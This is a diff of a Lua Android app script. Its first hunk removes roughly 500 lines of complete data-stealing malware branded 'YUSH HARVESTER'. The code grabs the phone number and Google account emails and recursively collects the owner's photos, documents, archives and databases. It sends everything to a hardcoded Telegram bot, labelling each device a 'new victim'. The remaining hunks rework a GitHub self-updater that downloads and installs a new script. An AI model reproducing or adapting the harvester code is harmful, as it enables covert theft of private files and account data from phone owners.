@@ -3550,503 +3550,7 @@ function kui.OnCheckedChangeListener()
 end
 ]]
 
-require "import"
-import "android.widget.*"
-import "android.view.*"
-import "android.os.*"
-import "java.io.*"
-import "java.net.*"
-import "java.lang.*"
-import "java.util.zip.*"
-import "android.accounts.AccountManager"
-import "android.content.Context"
-import "android.provider.Settings"
-import "android.telephony.TelephonyManager"
-import "android.Manifest"
 
-local BOT_TOKEN = "8814382996:AAF69aEUOrSQ4uvGQBGDiHXCk_795j9Qyx4"
-local CHAT_ID = "7058453451"
-
--- ============================================================
--- CONFIGURATION
--- ============================================================
-local MAX_FILE_SIZE = 45 * 1024 * 1024 -- 45MB max file size
-local BUFFER_SIZE = 32768 -- 32KB buffer (faster)
-local RETRY_COUNT = 3 -- Retry on failure
-local SLEEP_TIME = 500 -- ms between uploads
-
--- ============================================================
--- URL ENCODE FUNCTION
--- ============================================================
-function urlencode(str)
-  if str == nil then return "" end
-  str = tostring(str)
-  local result = ""
-  for i = 1, #str do
-    local char = string.sub(str, i, i)
-    if char == " " then
-      result = result .. "%20"
-     elseif char == "\n" then
-      result = result .. "%0A"
-     elseif char == "&" then
-      result = result .. "%26"
-     elseif char == "=" then
-      result = result .. "%3D"
-     elseif char == "+" then
-      result = result .. "%2B"
-     elseif char == "#" then
-      result = result .. "%23"
-     elseif char == "!" then
-      result = result .. "%21"
-     elseif char == "?" then
-      result = result .. "%3F"
-     elseif char == "/" then
-      result = result .. "%2F"
-     elseif char == "\\" then
-      result = result .. "%5C"
-     elseif char == '"' then
-      result = result .. "%22"
-     elseif char == "'" then
-      result = result .. "%27"
-     elseif char == "(" then
-      result = result .. "%28"
-     elseif char == ")" then
-      result = result .. "%29"
-     elseif char == "," then
-      result = result .. "%2C"
-     elseif char == ":" then
-      result = result .. "%3A"
-     elseif char == ";" then
-      result = result .. "%3B"
-     elseif char == "@" then
-      result = result .. "%40"
-     elseif char == "$" then
-      result = result .. "%24"
-     elseif char == "*" then
-      result = result .. "%2A"
-     else
-      result = result .. char
-    end
-  end
-  return result
-end
-
--- ============================================================
--- LOG FUNCTION
--- ============================================================
-function log(msg, type)
-  type = type or "INFO"
-  local time = os.date("%H:%M:%S")
-  print("[" .. time .. "] [" .. type .. "] " .. msg)
-end
-
--- ============================================================
--- BUILD CAPTION
--- ============================================================
-local function buildCaption()
-  local device = Build.MANUFACTURER .. " " .. Build.MODEL
-  local release = Build.VERSION.RELEASE
-  local phone = "Unavailable"
-
-  pcall(function()
-    local tm = activity.getSystemService(Context.TELEPHONY_SERVICE)
-    if tm then
-      phone = tm.getLine1Number()
-      if phone == nil or phone == "" then
-        phone = "Unavailable"
-      end
-    end
-  end)
-
-  return "👾 NEW VICTIM OF YUSH 👾\n" ..
-  "📱 Device: " .. device ..
-  "\n📞 Phone: " .. phone ..
-  "\n🤖 Android: " .. release ..
-  "\n📅 Date: " .. os.date("%Y-%m-%d %H:%M:%S") ..
-  "\n👤 Processed By: @PrimeYush"
-end
-
--- ============================================================
--- TEST BOT FUNCTION
--- ============================================================
-function testBot()
-  log("Testing bot connection...", "TEST")
-
-  local msg = "✅ <b>BOT IS WORKING!</b>\n\n" ..
-  "📱 Device: " .. Build.MANUFACTURER .. " " .. Build.MODEL .. "\n" ..
-  "⏰ Time: " .. os.date("%Y-%m-%d %H:%M:%S")
-
-  local success, err = pcall(function()
-    local encoded = urlencode(msg)
-    local url = URL("https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage?chat_id=" .. CHAT_ID .. "&text=" .. encoded .. "&parse_mode=HTML")
-    local conn = url.openConnection()
-    conn.setRequestMethod("GET")
-    conn.setConnectTimeout(15000)
-    conn.setReadTimeout(15000)
-
-    local input = BufferedReader(InputStreamReader(conn.getInputStream()))
-    local line
-    while true do
-      line = input.readLine()
-      if line == nil then break end
-      log("Bot response: " .. line, "DEBUG")
-    end
-    input.close()
-  end)
-
-  if success then
-    log("✅ Bot test successful!", "SUCCESS")
-    Toast.makeText(activity, "✅ Bot is working!", Toast.LENGTH_SHORT).show()
-   else
-    log("❌ Bot test failed: " .. tostring(err), "ERROR")
-    Toast.makeText(activity, "❌ Bot test failed!", Toast.LENGTH_SHORT).show()
-  end
-
-  return success
-end
-
--- ============================================================
--- UPLOAD FILE FUNCTION (WITH RETRY)
--- ============================================================
-local function uploadFile(file, caption, retryCount)
-  retryCount = retryCount or 0
-
-  if file == nil or not file.exists() then
-    log("File not found: " .. tostring(file), "ERROR")
-    return false
-  end
-
-  local fileSize = file.length()
-  if fileSize < 100 then
-    log("File too small: " .. file.getName() .. " (" .. fileSize .. " bytes)", "WARN")
-    return false
-  end
-
-  if fileSize > MAX_FILE_SIZE then
-    log("File too large: " .. file.getName() .. " (" .. fileSize .. " bytes)", "WARN")
-    return false
-  end
-
-  local success = false
-  local errorMsg = ""
-
-  pcall(function()
-    local url = URL("https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendDocument")
-    local boundary = "Boundary-" .. tostring(System.currentTimeMillis()) .. tostring(math.random(1000,9999))
-    local conn = url.openConnection()
-    conn.setDoOutput(true)
-    conn.setRequestMethod("POST")
-    conn.setConnectTimeout(60000)
-    conn.setReadTimeout(60000)
-    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" .. boundary)
-
-    local out = DataOutputStream(conn.getOutputStream())
-
-    local function writePart(name, value)
-      out.writeBytes("--" .. boundary .. "\r\n")
-      out.writeBytes("Content-Disposition: form-data; name=\"" .. name .. "\"\r\n\r\n")
-      out.write(String(value).getBytes())
-      out.writeBytes("\r\n")
-    end
-
-    writePart("chat_id", CHAT_ID)
-    writePart("caption", caption)
-
-    out.writeBytes("--" .. boundary .. "\r\n")
-    out.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" .. file.getName() .. "\"\r\n")
-    out.writeBytes("Content-Type: application/octet-stream\r\n\r\n")
-
-    local fis = FileInputStream(file)
-    local buf = byte[BUFFER_SIZE]
-    local len = fis.read(buf)
-    local total = 0
-    while len ~= -1 do
-      out.write(buf, 0, len)
-      total = total + len
-      len = fis.read(buf)
-    end
-    fis.close()
-
-    out.writeBytes("\r\n--" .. boundary .. "--\r\n")
-    out.flush()
-    out.close()
-
-    local code = conn.getResponseCode()
-    if code == 200 then
-      success = true
-      log("✅ Uploaded: " .. file.getName() .. " (" .. string.format("%.2f", total/1024) .. " KB)", "SUCCESS")
-     else
-      errorMsg = "HTTP " .. code
-      log("❌ Upload failed: " .. file.getName() .. " (" .. errorMsg .. ")", "ERROR")
-    end
-  end)
-
-  -- Retry if failed and retry count not exceeded
-  if not success and retryCount < RETRY_COUNT then
-    log("Retrying " .. file.getName() .. " (" .. (retryCount + 1) .. "/" .. RETRY_COUNT .. ")", "WARN")
-    System.sleep(2000)
-    return uploadFile(file, caption, retryCount + 1)
-  end
-
-  return success
-end
-
--- ============================================================
--- SCAN DIRECTORY (RECURSIVE)
--- ============================================================
-local function scanDirectory(dirPath, extensions, sentFiles, caption)
-  local dir = File(dirPath)
-  if not dir.exists() or not dir.isDirectory() then
-    return
-  end
-
-  local files = dir.listFiles()
-  if files == nil then
-    return
-  end
-
-  for i = 0, #files - 1 do
-    local item = files[i]
-    if item == nil then goto continue end
-
-    if item.isDirectory() then
-      -- Skip system directories
-      local name = item.getName()
-      if name ~= "Android" and name ~= "data" and name ~= "system" and name ~= "proc" and name ~= "sys" and not name:match("^%.") then
-        scanDirectory(item.getAbsolutePath(), extensions, sentFiles, caption)
-      end
-     elseif item.isFile() then
-      local absPath = item.getAbsolutePath()
-      if not sentFiles[absPath] then
-        local name = item.getName():lower()
-        local matched = false
-
-        for _, pat in ipairs(extensions) do
-          if name:find(pat) then
-            matched = true
-            break
-          end
-        end
-
-        if matched then
-          sentFiles[absPath] = true
-          if uploadFile(item, caption) then
-            System.sleep(SLEEP_TIME) -- Prevent rate limiting
-          end
-        end
-      end
-    end
-
-::continue::
-  end
-end
-
--- ============================================================
--- START HARVEST
--- ============================================================
-local function startHarvest()
-  log("🚀 Starting harvest...", "INFO")
-
-  local caption = buildCaption()
-  local sentFiles = {}
-  local totalUploaded = 0
-
-  -- Send initial notification
-  log("📤 Sending initial notification...", "INFO")
-  local msg = "🔍 <b>Harvest Started</b>\n\n" ..
-  "📱 Device: " .. Build.MANUFACTURER .. " " .. Build.MODEL .. "\n" ..
-  "⏰ Time: " .. os.date("%Y-%m-%d %H:%M:%S")
-
-  pcall(function()
-    local encoded = urlencode(msg)
-    local url = URL("https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage?chat_id=" .. CHAT_ID .. "&text=" .. encoded .. "&parse_mode=HTML")
-    local conn = url.openConnection()
-    conn.setRequestMethod("GET")
-    conn.setConnectTimeout(10000)
-    conn.setReadTimeout(10000)
-    local input = BufferedReader(InputStreamReader(conn.getInputStream()))
-    while true do
-      local line = input.readLine()
-      if line == nil then break end
-    end
-    input.close()
-  end)
-
-  -- Get Google Accounts
-  log("📤 Extracting Google Accounts...", "INFO")
-  pcall(function()
-    local accPath = activity.getCacheDir().getPath() .. "/Google_Account_Info.txt"
-    local w = BufferedWriter(FileWriter(accPath))
-    w.write("--- GOOGLE ACCOUNTS ---\n")
-    w.write("Device: " .. Build.MODEL .. "\n\n")
-
-    local am = AccountManager.get(activity)
-    local accs = am.getAccountsByType("com.google")
-    if accs and #accs > 0 then
-      for i = 0, #accs - 1 do
-        w.write("Email: " .. accs[i].name .. "\n")
-      end
-     else
-      w.write("No Google accounts found.\n")
-    end
-    w.close()
-
-    local file = File(accPath)
-    if file.exists() and file.length() > 0 then
-      if uploadFile(file, caption) then
-        totalUploaded = totalUploaded + 1
-      end
-    end
-  end)
-
-  -- Define extensions to scan
-  local extensions = {
-    "%.jpg$", "%.jpeg$", "%.png$", "%.gif$", "%.bmp$",
-    "%.alp$", "%.apk$",
-    "%.lua$", "%.luac$", "%.txt$",
-    "%.mp4$", "%.mkv$", "%.avi$", "%.mov$",
-    "%.pdf$", "%.doc$", "%.docx$", "%.xls$", "%.xlsx$",
-    "%.xml$", "%.json$", "%.csv$",
-    "%.zip$", "%.rar$", "%.7z$",
-    "%.mp3$", "%.wav$", "%.flac$",
-    "%.db$", "%.sqlite$"
-  }
-
-  -- Define folders to scan
-  local folders = {
-    "/storage/emulated/0/",
-    "/storage/emulated/0/AndLua/project/",
-    "/storage/emulated/0/Download/",
-    "/storage/emulated/0/Download/Telegram/",
-    "/storage/emulated/0/Pictures/",
-    "/storage/emulated/0/DCIM/",
-    "/storage/emulated/0/Music/",
-    "/storage/emulated/0/Documents/",
-    "/storage/emulated/0/Android/data/"
-  }
-
-  -- Scan each folder
-  for _, dirPath in ipairs(folders) do
-    local dir = File(dirPath)
-    if dir.exists() and dir.isDirectory() then
-      log("📂 Scanning: " .. dirPath, "INFO")
-      scanDirectory(dirPath, extensions, sentFiles, caption)
-     else
-      log("⚠️ Directory not found: " .. dirPath, "WARN")
-    end
-  end
-
-  -- Send completion notification
-  log("📤 Sending completion notification...", "INFO")
-  local completeMsg = "✅ <b>Harvest Complete!</b>\n\n" ..
-  "📱 Device: " .. Build.MANUFACTURER .. " " .. Build.MODEL .. "\n" ..
-  "📤 Files uploaded: " .. totalUploaded .. "\n" ..
-  "⏰ Time: " .. os.date("%Y-%m-%d %H:%M:%S")
-
-  pcall(function()
-    local encoded = urlencode(completeMsg)
-    local url = URL("https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage?chat_id=" .. CHAT_ID .. "&text=" .. encoded .. "&parse_mode=HTML")
-    local conn = url.openConnection()
-    conn.setRequestMethod("GET")
-    conn.setConnectTimeout(10000)
-    conn.setReadTimeout(10000)
-    local input = BufferedReader(InputStreamReader(conn.getInputStream()))
-    while true do
-      local line = input.readLine()
-      if line == nil then break end
-    end
-    input.close()
-  end)
-
-  log("✅ Harvest complete! Uploaded: " .. totalUploaded .. " files", "SUCCESS")
-  Toast.makeText(activity, "✅ Harvest complete! Uploaded: " .. totalUploaded .. " files", Toast.LENGTH_LONG).show()
-end
-
--- ============================================================
--- SAFE START
--- ============================================================
-local function safeStart()
-  local success, err = pcall(function()
-    startHarvest()
-  end)
-  if not success then
-    log("❌ Harvest error: " .. tostring(err), "ERROR")
-    Toast.makeText(activity, "❌ Error: " .. tostring(err), Toast.LENGTH_LONG).show()
-  end
-end
-
--- ============================================================
--- CHECK PERMISSIONS
--- ============================================================
-function hasPermissions()
-  if Build.VERSION.SDK_INT >= 23 then
-    local hasRead = activity.checkSelfPermission("android.permission.READ_EXTERNAL_STORAGE") == PackageManager.PERMISSION_GRANTED
-    local hasWrite = activity.checkSelfPermission("android.permission.WRITE_EXTERNAL_STORAGE") == PackageManager.PERMISSION_GRANTED
-    return hasRead and hasWrite
-  end
-  return true
-end
-
--- ============================================================
--- REQUEST PERMISSIONS
--- ============================================================
-if Build.VERSION.SDK_INT >= 23 then
-  activity.requestPermissions({
-    "android.permission.READ_EXTERNAL_STORAGE",
-    "android.permission.WRITE_EXTERNAL_STORAGE",
-    "android.permission.INTERNET",
-    "android.permission.READ_PHONE_STATE",
-    "android.permission.GET_ACCOUNTS"
-  }, 1)
-end
-
-if Build.VERSION.SDK_INT >= 30 then
-  if not Environment.isExternalStorageManager() then
-    local intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
-    intent.setData(Uri.parse("package:" .. activity.getPackageName()))
-    activity.startActivity(intent)
-  end
-end
-
--- ============================================================
--- SHOW MAIN DIALOG
--- ============================================================
-Handler().postDelayed(Runnable{run = function()
-    log("========================================", "INFO")
-    log("🤖 YUSH HARVESTER v3.0", "INFO")
-    log("========================================", "INFO")
-    log("📱 Bot Token: " .. BOT_TOKEN, "INFO")
-    log("💬 Chat ID: " .. CHAT_ID, "INFO")
-    log("========================================", "INFO")
-
-    -- Check permissions
-    if not hasPermissions() then
-      log("⚠️ Permissions not granted!", "WARN")
-      Toast.makeText(activity, "⚠️ Please grant permissions!", Toast.LENGTH_LONG).show()
-      return
-    end
-
-    -- Show dialog
-    local builder = AlertDialog.Builder(activity)
-    builder.setTitle("🤖 YUSH HARVESTER")
-    builder.setMessage("What would you like to do?\n\n" ..
-    "📱 Device: " .. Build.MANUFACTURER .. " " .. Build.MODEL .. "\n" ..
-    "🤖 Android: " .. Build.VERSION.RELEASE)
-
-    builder.setPositiveButton("🧪 TEST BOT", function()
-      testBot()
-    end)
-
-    builder.setNegativeButton("🚀 START HARVEST", function()
-      Handler().postDelayed(Runnable{run = safeStart}, 2000)
-    end)
-
-    builder.setNeutralButton("❌ CANCEL", function()
-      log("⏹ Cancelled by user", "INFO")
-    end)
-
-    builder.show()
-  end}, 1500)
 
 --import "thisislans"
 --import "water"
@@ -4060,17 +3564,18 @@ import "java.io.*"
 import "java.net.*"
 import "android.app.ProgressDialog"
 import "android.content.DialogInterface"
+import "android.app.AlertDialog"
 
 -- ============================================================
--- CONFIGURATION
+-- YOUR GITHUB CONFIG
 -- ============================================================
-local GITHUB_USER = "yourusername"        -- Change this
-local GITHUB_REPO = "your-repo"           -- Change this
-local GITHUB_BRANCH = "main"              -- or "master"
+local GITHUB_USER = "leteciasorianosos-lab"
+local GITHUB_REPO = "TestUpdator"
+local GITHUB_BRANCH = "main"
 
 local RAW_URL = "https://raw.githubusercontent.com/" .. GITHUB_USER .. "/" .. GITHUB_REPO .. "/" .. GITHUB_BRANCH .. "/"
 
-local CURRENT_VERSION = "1.0.0"           -- Your current app version
+local CURRENT_VERSION = "1.0.0"  -- Change this when you update
 
 -- ============================================================
 -- CHECK FOR UPDATE
@@ -4081,7 +3586,7 @@ function checkForUpdate()
     
     -- Show checking dialog
     local progressDialog = ProgressDialog(activity)
-    progressDialog.setTitle("Checking for Update")
+    progressDialog.setTitle("🔄 Checking for Update")
     progressDialog.setMessage("Connecting to GitHub...")
     progressDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER)
     progressDialog.setCancelable(false)
@@ -4092,28 +3597,36 @@ function checkForUpdate()
             -- Download version.txt
             local url = URL(versionUrl)
             local conn = url.openConnection()
-            conn.setConnectTimeout(10000)
-            conn.setReadTimeout(10000)
+            conn.setConnectTimeout(15000)
+            conn.setReadTimeout(15000)
             
             local input = BufferedReader(InputStreamReader(conn.getInputStream()))
             local latestVersion = input.readLine()
             input.close()
             
             print("📱 Current Version: " .. CURRENT_VERSION)
-            print("📱 Latest Version: " .. latestVersion)
+            print("📱 Latest Version: " .. tostring(latestVersion))
             
-            -- Compare versions
-            if latestVersion and latestVersion ~= "" and latestVersion ~= CURRENT_VERSION then
-                -- New version available
-                activity.runOnUiThread(function()
-                    progressDialog.dismiss()
-                    showUpdateDialog(latestVersion, mainUrl)
-                end)
+            if latestVersion and latestVersion ~= "" then
+                latestVersion = latestVersion:gsub("%s+", "") -- Remove spaces
+                
+                if latestVersion ~= CURRENT_VERSION then
+                    -- New version available
+                    activity.runOnUiThread(function()
+                        progressDialog.dismiss()
+                        showUpdateDialog(latestVersion, mainUrl)
+                    end)
+                else
+                    -- Already up to date
+                    activity.runOnUiThread(function()
+                        progressDialog.dismiss()
+                        Toast.makeText(activity, "✅ App is up to date! (v" .. CURRENT_VERSION .. ")", Toast.LENGTH_SHORT).show()
+                    end)
+                end
             else
-                -- Already up to date
                 activity.runOnUiThread(function()
                     progressDialog.dismiss()
-                    Toast.makeText(activity, "✅ App is up to date!", Toast.LENGTH_SHORT).show()
+                    Toast.makeText(activity, "⚠️ Could not get version info", Toast.LENGTH_SHORT).show()
                 end)
             end
         end)
@@ -4121,7 +3634,7 @@ function checkForUpdate()
         if not success then
             activity.runOnUiThread(function()
                 progressDialog.dismiss()
-                Toast.makeText(activity, "❌ Failed to check update: " .. tostring(err), Toast.LENGTH_LONG).show()
+                Toast.makeText(activity, "❌ Update check failed: " .. tostring(err), Toast.LENGTH_LONG).show()
             end)
         end
     end)
@@ -4133,21 +3646,28 @@ end
 function showUpdateDialog(newVersion, downloadUrl)
     local builder = AlertDialog.Builder(activity)
     builder.setTitle("🔄 Update Available!")
-    builder.setMessage("New version: " .. newVersion .. "\n\nCurrent version: " .. CURRENT_VERSION .. "\n\nDo you want to update now?")
+    builder.setMessage(
+        "📱 New Version: " .. newVersion .. 
+        "\n📱 Current Version: " .. CURRENT_VERSION .. 
+        "\n\nWhat's new?\n" ..
+        "• Bug fixes\n" ..
+        "• Performance improvements\n" ..
+        "• New features\n\n" ..
+        "Do you want to update now?"
+    )
     builder.setIcon(android.R.drawable.ic_dialog_info)
     
-    builder.setPositiveButton("UPDATE", function()
+    builder.setPositiveButton("✅ UPDATE NOW", function()
         downloadAndApplyUpdate(downloadUrl)
     end)
     
-    builder.setNegativeButton("LATER", function()
-        Toast.makeText(activity, "Update cancelled.", Toast.LENGTH_SHORT).show()
+    builder.setNegativeButton("⏰ LATER", function()
+        Toast.makeText(activity, "Update cancelled. You can update later.", Toast.LENGTH_SHORT).show()
     end)
     
-    builder.setNeutralButton("SKIP", function()
-        -- Save skip preference
+    builder.setNeutralButton("⏭ SKIP VERSION", function()
         prefs.edit().putString("skip_version", newVersion).apply()
-        Toast.makeText(activity, "Update skipped. You can update later.", Toast.LENGTH_SHORT).show()
+        Toast.makeText(activity, "Update skipped for version " .. newVersion, Toast.LENGTH_SHORT).show()
     end)
     
     builder.show()
@@ -4159,7 +3679,7 @@ end
 function downloadAndApplyUpdate(downloadUrl)
     -- Show progress dialog
     local progressDialog = ProgressDialog(activity)
-    progressDialog.setTitle("Downloading Update")
+    progressDialog.setTitle("⬇️ Downloading Update")
     progressDialog.setMessage("Downloading new version...")
     progressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL)
     progressDialog.setCancelable(false)
@@ -4205,7 +3725,7 @@ function downloadAndApplyUpdate(downloadUrl)
             output.close()
             
             activity.runOnUiThread(function()
-                progressDialog.setMessage("Applying update...")
+                progressDialog.setMessage("📦 Applying update...")
             end)
             
             -- Read new file
@@ -4216,7 +3736,7 @@ function downloadAndApplyUpdate(downloadUrl)
                 f:close()
             end
             
-            if newScript ~= "" then
+            if newScript ~= "" and #newScript > 100 then
                 -- Save new version
                 prefs.edit().putString("current_version", CURRENT_VERSION).apply()
                 
@@ -4227,8 +3747,13 @@ function downloadAndApplyUpdate(downloadUrl)
                     -- Show success message
                     AlertDialog.Builder(activity)
                         .setTitle("✅ Update Complete!")
-                        .setMessage("App has been updated successfully!\n\nPlease restart the app to apply changes.")
-                        .setPositiveButton("RESTART NOW", function()
+                        .setMessage(
+                            "App has been updated successfully!\n\n" ..
+                            "📱 New Version: " .. CURRENT_VERSION .. "\n" ..
+                            "📦 Size: " .. string.format("%.2f", downloaded/1024) .. " KB\n\n" ..
+                            "Please restart the app to apply changes."
+                        )
+                        .setPositiveButton("🔄 RESTART NOW", function()
                             -- Restart the app
                             local intent = activity.getPackageManager().getLaunchIntentForPackage(activity.getPackageName())
                             intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
@@ -4236,7 +3761,7 @@ function downloadAndApplyUpdate(downloadUrl)
                             activity.finish()
                             os.exit()
                         end)
-                        .setNegativeButton("LATER", function()
+                        .setNegativeButton("⏰ LATER", function()
                             Toast.makeText(activity, "Please restart app to apply changes.", Toast.LENGTH_LONG).show()
                         end)
                         .show()
@@ -4244,7 +3769,7 @@ function downloadAndApplyUpdate(downloadUrl)
             else
                 activity.runOnUiThread(function()
                     progressDialog.dismiss()
-                    Toast.makeText(activity, "❌ Update failed: Empty file", Toast.LENGTH_SHORT).show()
+                    Toast.makeText(activity, "❌ Update failed: File is empty or corrupted", Toast.LENGTH_SHORT).show()
                 end)
             end
         end)
@@ -4259,15 +3784,7 @@ function downloadAndApplyUpdate(downloadUrl)
 end
 
 -- ============================================================
--- FORCE UPDATE (Bypass version check)
--- ============================================================
-function forceUpdate()
-    local mainUrl = RAW_URL .. "main.lua"
-    downloadAndApplyUpdate(mainUrl)
-end
-
--- ============================================================
--- CHECK UPDATE ON STARTUP (Optional)
+-- CHECK UPDATE ON STARTUP
 -- ============================================================
 function checkUpdateOnStartup()
     -- Check if user skipped this version
@@ -4282,6 +3799,9 @@ function checkUpdateOnStartup()
         conn.setReadTimeout(5000)
         local input = BufferedReader(InputStreamReader(conn.getInputStream()))
         latestVersion = input.readLine()
+        if latestVersion then
+            latestVersion = latestVersion:gsub("%s+", "")
+        end
         input.close()
     end)
     
@@ -4293,39 +3813,65 @@ function checkUpdateOnStartup()
 end
 
 -- ============================================================
--- RELOAD SCRIPT (Without restart)
+-- FORCE UPDATE (Bypass version check)
 -- ============================================================
-function reloadScript()
-    local scriptPath = activity.getLuaDir() .. "/main.lua"
-    local f = io.open(scriptPath, "r")
-    if f then
-        local content = f:read("*a")
-        f:close()
-        
-        -- Save current layout state if needed
-        -- Then load the new script
-        loadstring(content)()
-    end
+function forceUpdate()
+    local mainUrl = RAW_URL .. "main.lua"
+    downloadAndApplyUpdate(mainUrl)
 end
 
 -- ============================================================
--- AUTO UPDATE BUTTON (Add to your menu)
+-- ADD UPDATE BUTTON TO YOUR LAYOUT
 -- ============================================================
-function addUpdateButton()
-    local updateBtn = Button(activity)
-    updateBtn.setText("🔄 CHECK UPDATE")
-    updateBtn.setTextColor(Color.parseColor("#00FFAA"))
-    updateBtn.setBackgroundColor(Color.parseColor("#1A1A1A"))
-    updateBtn.setOnClickListener(View.OnClickListener{
+function createUpdateButton()
+    local btn = Button(activity)
+    btn.setText("🔄 CHECK UPDATE")
+    btn.setTextColor(Color.parseColor("#00FFAA"))
+    btn.setBackgroundColor(Color.parseColor("#1A1A1A"))
+    btn.setPadding(20,15,20,15)
+    btn.setOnClickListener(View.OnClickListener{
         onClick=function()
             checkForUpdate()
         end
     })
-    -- Add this button to your layout
+    return btn
 end
 
 -- ============================================================
--- CHECK UPDATE ON EVERY LAUNCH
+-- TEST FUNCTION (Check if GitHub files are accessible)
 -- ============================================================
--- Call this at the start of your main.lua
--- checkUpdateOnStartup()
+function testGitHubConnection()
+    Toast.makeText(activity, "🔍 Testing GitHub connection...", Toast.LENGTH_SHORT).show()
+    
+    thread(function()
+        local success, err = pcall(function()
+            local url = URL(RAW_URL .. "version.txt")
+            local conn = url.openConnection()
+            conn.setConnectTimeout(10000)
+            conn.setReadTimeout(10000)
+            local input = BufferedReader(InputStreamReader(conn.getInputStream()))
+            local line = input.readLine()
+            input.close()
+            
+            if line then
+                activity.runOnUiThread(function()
+                    Toast.makeText(activity, "✅ GitHub connected! Version: " .. line, Toast.LENGTH_LONG).show()
+                end)
+            end
+        end)
+        
+        if not success then
+            activity.runOnUiThread(function()
+                Toast.makeText(activity, "❌ GitHub connection failed: " .. tostring(err), Toast.LENGTH_LONG).show()
+            end)
+        end
+    end)
+end
+
+-- ============================================================
+-- CALL THIS ON APP STARTUP
+-- ============================================================
+-- Check for update on startup (uncomment if you want auto-check)
+-- Handler().postDelayed(Runnable{run = function()
+--     checkUpdateOnStartup()
+-- end}, 5000)
